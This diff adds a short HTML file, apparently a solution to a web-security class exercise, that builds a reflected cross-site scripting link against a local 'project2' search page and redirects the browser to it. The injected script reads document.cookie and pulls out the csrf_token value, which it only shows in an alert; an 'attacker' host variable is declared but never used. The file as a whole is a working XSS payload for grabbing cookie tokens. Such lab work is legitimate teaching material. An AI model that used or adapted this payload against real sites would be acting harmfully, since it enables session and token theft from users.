@@ -1,0 +1,26 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+
+function payload() {
+    var cookie = document.cookie.toString();
+    var trimmed = cookie.substring(cookie.indexOf("csrf_token"));
+    var token = trimmed.substring(0, trimmed.indexOf(";"));
+    alert(token);
+}
+
+function makeLink(xssdefense, target) {
+    return target + "./search?csrfdefense=0&xssdefense=" + xssdefense.toString() + "&q=" + 
+        encodeURIComponent("<script" + ">" + payload.toString() + ";payload();" + "<" + "/script" + ">");
+}
+
+var xssdefense = 0;
+var target = "http://127.0.0.1/project2/";
+var attacker = "http://127.0.0.1:31337/";
+
+$(function() {
+    var url = makeLink(xssdefense, target);
+    window.location.href = url;
+});
+
+</script>
